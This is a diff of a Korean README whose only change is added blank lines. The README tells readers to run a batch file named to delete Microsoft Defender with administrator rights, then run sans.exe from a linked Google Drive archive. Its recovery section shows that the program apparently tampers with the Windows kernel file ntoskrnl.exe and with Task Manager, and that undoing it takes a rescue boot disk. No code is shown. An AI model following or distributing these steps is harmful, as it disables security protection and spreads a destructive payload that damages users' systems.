@@ -3,6 +3,7 @@
 사용 방법⬇️
 
 1.Microsoft Defender del.bat을 관리자 권한으로 실행한다.
+
 2.sans.zip의 압축을 풀고 안에 있는 sans.exe를 실행한다. (폴더 안에 있는 파일을 옮겨서는 안된다.)
 
 *다운은 https://drive.google.com/file/d/1op_IEwEJVRcm54yajAecURJljIR0cjHL/view?usp=drive_link 여기에서!
@@ -11,9 +12,15 @@
 
 # 복구 방법
 1.Hirens boot cd로 부팅 한다.
+
 2. win+R (c:\windows\system32)
+
 3.ntoskrnl.exe.bak를 한번 클릭한다 그리고 f2를 누르고 ntoskrnl.exe로 바꾼다.
+
 4.재부팅 한다.
+
 5.윈도우에 진입 하고 같이 다운 받은 taskmgr.reg 파일을 실행한다.
+
 6.재부팅 한다.
+
 특이점: windows 8.x는 알아서 복구 한다.
